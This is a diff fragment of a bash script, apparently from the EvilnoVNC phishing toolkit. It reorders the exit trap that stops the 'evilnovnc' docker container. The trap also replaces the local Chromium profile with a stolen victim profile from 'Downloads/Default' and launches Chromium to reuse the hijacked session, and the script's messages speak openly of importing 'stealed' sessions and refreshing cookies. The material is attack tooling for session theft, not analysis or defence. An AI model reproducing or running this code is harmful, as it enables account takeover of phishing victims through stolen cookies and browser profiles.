@@ -130,8 +130,8 @@ else printf "\n\e[1;32m[+] Avoiding dynamic resolution steps.." ; sleep 2 ; fi
 printf "\n\e[1;34m[+] Desktop Resolution: $RESOLUTION" ; sleep 2
 printf "\n\e[1;32m[+] Cookies will be updated every 30 seconds.. \e[1;31m"
 
-trap 'printf "\n\e[1;33m[>] Import stealed session to Chromium..\n" ; sleep 2
-sudo docker stop evilnovnc > /dev/null 2>&1 &
+trap 'sudo docker stop -t 2 evilnovnc > /dev/null 2>&1
+printf "\n\e[1;33m[>] Import stealed session to Chromium..\n" ; sleep 2
 rm -Rf ~/.config/chromium/Default > /dev/null 2>&1 ; cp -R Downloads/Default ~/.config/chromium/ > /dev/null 2>&1
 /bin/bash -c "/usr/bin/chromium --no-sandbox --disable-crash-reporter --password-store=basic &" > /dev/null 2>&1 &
 printf "\e[1;32m[+] Done!\n\e[1;0m"' SIGTERM EXIT
